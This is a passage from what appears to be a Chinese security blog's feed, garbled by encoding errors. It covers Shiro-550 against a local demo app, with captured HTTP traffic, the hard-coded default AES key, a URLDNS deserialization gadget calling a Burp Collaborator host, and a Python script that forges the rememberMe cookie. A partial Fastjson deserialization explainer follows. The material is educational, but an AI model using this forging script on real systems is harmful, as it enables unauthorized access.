text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.124.15:8081/shirodemo_war/login.jsp</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=root&amp;password=secret&amp;rememberMe=on&amp;submit=Login</span><br><span class="line"></span><br><span class="line">////Response</span><br><span class="line">HTTP/1.1 302 </span><br><span class="line">Set-Cookie: JSESSIONID=1467280596697A870D71F2A15C2E5B84; Path=/shirodemo_war; HttpOnly</span><br><span class="line">Set-Cookie: rememberMe=deleteMe; Path=/shirodemo_war; Max-Age=0; Expires=Mon, 29-Aug-2022 06:06:08 GMT</span><br><span class="line">Set-Cookie: rememberMe=TJ1wpcFQ6EgXmXmmHQ06fysKrMk3tVUeNsh42bYAnXePmFLX+a9DUp7SyfQcdXvFBHHEY0lPYFGP4TtwJA8MgiQVNrol9LIHlwzUlSkz2ZkCUkUYgW0aGK1Ben6bfU1wLp56z/ygIC0x1qXDDYzzRhdMHptkdPOCTJ1DVgtDP51AeESfhuKP/EVJI5JS+e/QTXReg8GtYowZ48PvWTf65YGwp+j+/LNCbn1Wsk1V5xYf9P7q2Xmm6Zh4C5nV2siStTq32oVYtmkowJSV9LCCTsjAZ0Nw+p5tGxsIbmJU3viTOh1PnMKT2XDEiYor7Jr/SKnjsWkYBWSkSvLs+sPRGwVXUVI1LZ3er9UIzsgWse/lOjXdJ8uV71CATvqaG+71HDy9S8byDEdIW1kMh7zigLTEKAp2edgJi3X19vIcoQBkB3ZSJSEcAwG3tCTfyeSnMFJjNa3NmJ+jMyYQO3Q/oZkSbn7fGRG5aIX0OILCDI7Mk9k9YnkIfijo60KrJEcc; Path=/shirodemo_war; Max-Age=31536000; Expires=Wed, 30-Aug-2023 06:06:08 GMT; HttpOnly</span><br><span class="line">Location: /shirodemo_war/;jsessionid=1467280596697A870D71F2A15C2E5B84</span><br><span class="line">Content-Length: 0</span><br><span class="line">Date: Tue, 30 Aug 2022 06:06:08 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></li><li><p>æ ¹æœ¬åŸå› æ˜¯AES åŠ å¯†çš„å¯†é’¥é»˜è®¤ç¡¬ç¼–ç åœ¨ä»£ç é‡Œï¼ˆShiro-550ï¼‰</p></li></ol><h6 id="cookieè§£å¯†åˆ†æ"><a href="#cookieè§£å¯†åˆ†æ" class="headerlink" title="cookieè§£å¯†åˆ†æ"></a>cookieè§£å¯†åˆ†æ</h6><ol><li><p>ideaå…¨å±€æŸ¥æ‰¾cookieå…³é”®å­—ï¼Œå‘ç°ä¸€ä¸‹ä¸shiroæ¡†æ¶ç›¸å…³çš„class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface Cookie</span><br><span class="line">public class SimpleCookie implements Cookie</span><br><span class="line">public class CookieRememberMeManager extends AbstractRememberMeManager </span><br></pre></td></tr></table></figure></li><li><p>è·Ÿè¿›CookieRememberMeManageræŸ¥çœ‹ç›¸å…³å‡½æ•°</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830144844310.png" alt="image-20220830144844310"> </p><p>è¿™ä¸ªæ–¹æ³•ä¸­å…ˆåˆ¤æ–­cookie base64åæ˜¯å¦ä¸ºdeletemeï¼Œæ˜¯çš„è¯åˆ™è¿”å›ï¼Œå¦åˆ™baseè§£å¯†åè¿”å›ï¼Œçœ‹çœ‹è°è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830145046096.png" alt="image-20220830145046096"> </p><p>è·Ÿè¿›convertBytesToPrincipalsçœ‹çœ‹</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830145240622.png" alt="image-20220830145240622"> ã€</p><p>æ­¤å‡½æ•°å¯¹base64è§£å¯†åçš„byteæµè¿›è¡Œdecryptï¼Œç„¶åååºåˆ—åŒ–ã€‚è·Ÿè¿›çœ‹çœ‹</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830145403934.png" alt="image-20220830145403934"> </p><p>è·å–cipherServiceåå¯¹bytesè§£å¯†</p><p>å…¶ä¸­getDecryptionCipherKey()ä¸ºè·å–åŠ è§£ç§˜é’¥</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830151300954.png" alt="image-20220830151300954"> </p><p>è·Ÿè¿›cipherServiceå‘ç°ä½¿ç”¨çš„æ˜¯AesåŠ å¯†ï¼Œç§˜é’¥ä¸ºbase64åŠ å¯†çš„kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p></li><li><p>æ€»ç»“ä¸Šè¿°æµç¨‹ï¼Œå‘ç°shiroå¯¹cookieè§£å¯†æµç¨‹ä¸º</p><p>base64() -&gt; Aes() ä¹‹åå¾—åˆ°åºåˆ—åŒ–å†…å®¹</p></li><li><p>è·Ÿè¿›ååºåˆ—åŒ–å‡½æ•°æŸ¥çœ‹</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830151913617.png" alt="image-20220830151913617"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830151851054.png" alt="image-20220830151851054"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830152034059.png" alt="image-20220830152034059"></p></li></ol><h6 id="cookieåŠ å¯†åˆ†æ"><a href="#cookieåŠ å¯†åˆ†æ" class="headerlink" title="cookieåŠ å¯†åˆ†æ"></a>cookieåŠ å¯†åˆ†æ</h6><ol><li><p>åœ¨onSuccessfulLoginä¸‹æ–­ç‚¹</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830152756753.png" alt="image-20220830152756753"> </p></li><li><p>å¯ä»¥çœ‹åˆ°tokenä¸ºæ˜æ–‡</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830152856451.png" alt="image-20220830152856451"> </p></li><li><p>è·Ÿè¿›</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830153050246.png" alt="image-20220830153050246"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830153157790.png" alt="image-20220830153157790"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830153218152.png" alt="image-20220830153218152"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830153255567.png" alt="image-20220830153255567"> </p><p>å¯è§å’Œè§£å¯†è¿‡ç¨‹å¯¹ç§°ï¼Œä»¥ä¸Šå°±æ˜¯cookieåŠ è§£å¯†å…¨è¿‡ç¨‹</p></li></ol><h6 id="shiro550åˆ©ç”¨"><a href="#shiro550åˆ©ç”¨" class="headerlink" title="shiro550åˆ©ç”¨"></a>shiro550åˆ©ç”¨</h6><ol><li><p>DNSæ¢æµ‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">URLDNSé“¾</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://fudjktkkeq3jv7koksa072r6exkn8c.burpcollaborator.net&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">urlClass</span> <span class="operator">=</span> URL.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldHashCode</span> <span class="operator">=</span> urlClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        fieldHashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldHashCode.set(url,<span class="number">123456</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        fieldHashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        <span class="comment">//unSerialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">ooStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ooStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unSerialize</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oiStrean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(fileName));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> oiStrean.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>pythonåŠ å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_bin</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS=AES.block_size</span><br><span class="line">    pad=<span class="keyword">lambda</span> s:s+((BS-<span class="built_in">len</span>(s)%BS)*<span class="built_in">chr</span>(BS-<span class="built_in">len</span>(s)%BS)).encode()</span><br><span class="line">    key=<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode=AES.MODE_CBC</span><br><span class="line">    iv=uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor=AES.new(base64.b64decode(key),mode,iv)</span><br><span class="line">    ciphertext=base64.b64encode(iv+encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data=convert_bin(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(AES_enc(data))</span><br><span class="line"></span><br><span class="line">ç»“æœï¼š</span><br><span class="line">LPWtx1kiT9aPgmH56vw8ertCoG8oAFBmIu3ZtNyaoQtCK9vOekQ4Tx4dKtoxKOsRizCxYoIlWHkHJqvzIZQ5YpgqYEoUVEVqExcCH5xVfbgQD12/ge8euUyZiwIXNouGyO4GbSYEdenS437PYmBvIhQqh3nUrY1KKoVRPOb+F0FxWe9cYXHO/QXvPoLAwIyO/YQte8bW02bYOA26SSKbMLQ4glOTf52JbwLkVB6Shfc4ylY8kDEx34F/E2pwDMk1JNbQfDoUVUAYTN4JEcr4MidEZm5m/1pPnXvvF00A+m+h5ajsDrRRBnOGiqZb6FdHmyh1tA/KUcFMtS29hiEMwDqne0J/9keqnz+9216OF35lWkGcwrOxo7Kab1XCJwM2OR8clh8EtGjO4SQPixNemLcaAPMD23yj5u7d/6EpqmyQ01/93kzt6ATeIjahg9ftNrly9P5oFpF383710PONt5bA80uFU9NY9PRAGstfoITH1hvXynn76HdD3qCZxrqGyP11eQlU1sKByp1ncS9Pqg==</span><br></pre></td></tr></table></figure></li><li><p>æŠ“åŒ…è¯¥cookieï¼Œåˆ©ç”¨æˆåŠŸ</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830165338912.png" alt="image-20220830165338912"></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Shiro&quot;&gt;&lt;a href=&quot;#Shiro&quot; class=&quot;headerlink&quot; title=&quot;Shiro&quot;&gt;&lt;/a&gt;Shiro&lt;/h2&gt;&lt;h4 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;</summary>
      
    
    
    
    <category term="javaå®‰å…¨" scheme="http://example.com/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javaå®‰å…¨" scheme="http://example.com/tags/java%E5%AE%89%E5%85%A8/"/>
    
    <category term="javaæ¡†æ¶" scheme="http://example.com/tags/java%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson ååºåˆ—åŒ–æ¼æ´</title>
    <link href="http://example.com/2022/07/31/fastjson%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    <id>http://example.com/2022/07/31/fastjson%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</id>
    <published>2022-07-31T13:16:50.000Z</published>
    <updated>2022-09-01T00:38:50.463Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fastjson-ååºåˆ—åŒ–æ¼æ´"><a href="#fastjson-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="fastjson ååºåˆ—åŒ–æ¼æ´"></a>fastjson ååºåˆ—åŒ–æ¼æ´</h1><h2 id="fastjsonä»‹ç»"><a href="#fastjsonä»‹ç»" class="headerlink" title="fastjsonä»‹ç»"></a>fastjsonä»‹ç»</h2><ol><li><p>åœ¨å‰åç«¯æ•°æ®ä¼ è¾“äº¤äº’ä¸­,ç»å¸¸ä¼šé‡åˆ°<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">å­—ç¬¦ä¸²</a>(String)ä¸json,XMLç­‰æ ¼å¼ç›¸äº’è½¬æ¢ä¸è§£æï¼Œå…¶ä¸­jsonä»¥è·¨è¯­è¨€ï¼Œè·¨å‰åç«¯çš„ä¼˜ç‚¹åœ¨å¼€å‘ä¸­è¢«é¢‘ç¹ä½¿ç”¨ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥è¯´æ˜¯æ ‡å‡†çš„æ•°æ®äº¤æ¢æ ¼å¼ã€‚fastjson æ˜¯ä¸€ä¸ªjavaè¯­è¨€ç¼–å†™çš„é«˜æ€§èƒ½ä¸”åŠŸèƒ½å®Œå–„çš„JSONåº“ï¼Œå®ƒé‡‡ç”¨ä¸€ç§â€œå‡å®šæœ‰åºå¿«é€ŸåŒ¹é…â€çš„ç®—æ³•ï¼ŒæŠŠJSON Parse çš„æ€§èƒ½æå‡åˆ°äº†æè‡´ã€‚å®ƒçš„æ¥å£ç®€å•æ˜“ç”¨ï¼Œå·²ç»è¢«å¹¿æ³›ä½¿ç”¨åœ¨ç¼“å­˜åºåˆ—åŒ–ï¼Œåè®®äº¤äº’ï¼ŒWebè¾“å‡ºç­‰å„ç§åº”ç”¨åœºæ™¯ä¸­ã€‚</p></li><li><p>FastJsonæ˜¯å•Šé‡Œå·´å·´çš„çš„å¼€æºåº“ï¼Œç”¨äºå¯¹JSONæ ¼å¼çš„æ•°æ®è¿›è¡Œè§£æå’Œæ‰“åŒ…ã€‚</p></li></ol><h2 id="æ¼æ´ä»‹ç»"><a href="#æ¼æ´ä»‹ç»" class="headerlink" title="æ¼æ´ä»‹ç»"></a>æ¼æ´ä»‹ç»</h2><p>fastjsonåœ¨åºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰ä½¿ç”¨Javaè‡ªå¸¦çš„åºåˆ—åŒ–æœºåˆ¶ï¼Œè€Œæ˜¯è‡ªå®šä¹‰äº†ä¸€å¥—æœºåˆ¶ã€‚å…¶å®ï¼Œå¯¹äºJSONæ¡†æ¶æ¥è¯´ï¼Œæƒ³è¦æŠŠä¸€ä¸ªJavaå¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå¯ä»¥æœ‰ä¸¤ç§é€‰æ‹©ï¼šåŸºäºå±æ€§åŸºäºsetter&#x2F;getter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Apple</span> <span class="keyword">implements</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Big_Decimal price;</span><br><span class="line">    <span class="comment">//çœç•¥ setter/getterã€toStringç­‰</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">iphone</span> <span class="keyword">implements</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Big_Decimal price;</span><br><span class="line">    <span class="comment">//çœç•¥ setter/getterã€toStringç­‰</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">toJSONString : &#123;<span class="string">&quot;fruit&quot;</span>:&#123;<span class="string">&quot;price&quot;</span>:<span class="number">0.5</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">toJSONString : &#123;<span class="string">&quot;fruit&quot;</span>:&#123;<span class="string">&quot;price&quot;</span>:<span class="number">500</span>&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Fastjson</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.name=<span class="string">&quot;james&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.age=<span class="string">&quot;18&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String test)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name setter called&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name getter called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String test)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;age setter called&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = test;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;age getter called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Fastjson&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&#x27;&quot;</span> + age + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> JSON.toJSONString(<span class="keyword">new</span> <span class="title class_">Fastjson</span>());</span><br><span class="line">        System.out.println(o); <span class="comment">//classè½¬ä¸ºjson</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;------------&quot;</span>);</span><br><span class="line">        <span class="type">Fastjson</span> <span class="variable">obj</span> <span class="operator">=</span> (Fastjson) JSON.parse(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.fastjson.test.Fastjson\&quot;,\&quot;name\&quot;:\&quot;test name\&quot;, \&quot;age\&quot;:\&quot;test age\&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(obj); <span class="comment">//æ™®é€šjsonå¯¹è±¡è½¬ä¸ºobjectç±»</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">output:<span class="comment">//</span></span><br><span class="line">age getter called</span><br><span class="line">name getter called</span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="string">&quot;18&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;james&quot;</span>&#125;</span><br><span class="line">------------</span><br><span class="line">name setter called</span><br><span class="line">age setter called</span><br><span class="line">Fastjson&#123;name=<span class="string">&#x27;test name&#x27;</span>, age=<span class="string">&#x27;test age&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼š</span><br><span class="line">fastjsonå¼•å…¥äº†AutoTypeï¼Œå³åœ¨åºåˆ—åŒ–çš„æ—¶å€™ï¼ŒæŠŠåŸå§‹ç±»å‹è®°å½•ä¸‹æ¥ã€‚</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;fruit&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.hollis.lab.fastjson.test.Apple&quot;</span>,</span><br><span class="line">        <span class="string">&quot;price&quot;</span>:<span class="number">0.5</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastjson åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šå»æ‰¾æˆ‘ä»¬åœ¨ <code>@type</code> ä¸­è§„å®šçš„ç±»æ˜¯å“ªä¸ªç±»ï¼Œç„¶ååœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨è¿™äº› setter ä¸ getter æ–¹æ³•çš„è°ƒç”¨ï¼Œæ³¨æ„ï¼å¹¶ä¸æ˜¯æ‰€æœ‰çš„ setter å’Œ getter æ–¹æ³•ã€‚</p><p><strong>ä¸‹é¢ç›´æ¥å¼•ç”¨ç»“è®ºï¼ŒFastjsonä¼šå¯¹æ»¡è¶³ä¸‹åˆ—è¦æ±‚çš„setter&#x2F;getteræ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">æ»¡è¶³æ¡ä»¶çš„setterï¼š</span><br><span class="line"></span><br><span class="line">- éé™æ€å‡½æ•°</span><br><span class="line">- è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±»</span><br><span class="line">- å‚æ•°ä¸ªæ•°ä¸º1ä¸ª</span><br><span class="line"></span><br><span class="line">æ»¡è¶³æ¡ä»¶çš„getterï¼š</span><br><span class="line"></span><br><span class="line">- éé™æ€æ–¹æ³•</span><br><span class="line">- æ— å‚æ•°</span><br><span class="line">- **è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollectionæˆ–Mapæˆ–AtomicBooleanæˆ–AtomicIntegeræˆ–AtomicLong**</span><br></pre></td></tr></table></figure><p>æˆ‘ä¸ªäººç†è§£ fastjson çš„åˆ©ç”¨æ”»å‡»å…¶å®æ˜¯è›®ç®€å•çš„ï¼Œå› ä¸ºæ²¡æœ‰é‚£ä¹ˆå¤šå¤æ‚çš„é“¾å­ï¼Œä¹Ÿä¸éœ€è¦åå°„ä¿®æ”¹å€¼ï¼Œç›´æ¥åœ¨ json ä¸²é‡Œé¢èµ‹å€¼å°±å¥½äº†ã€‚</p><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>ç”±å‰é¢çŸ¥é“ï¼ŒFastjsonæ˜¯è‡ªå·±å®ç°çš„ä¸€å¥—åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ï¼Œä¸æ˜¯ç”¨çš„JavaåŸç”Ÿçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ã€‚æ— è®ºæ˜¯å“ªä¸ªç‰ˆæœ¬ï¼ŒFastjsonååºåˆ—åŒ–æ¼æ´çš„åŸç†éƒ½æ˜¯ä¸€æ 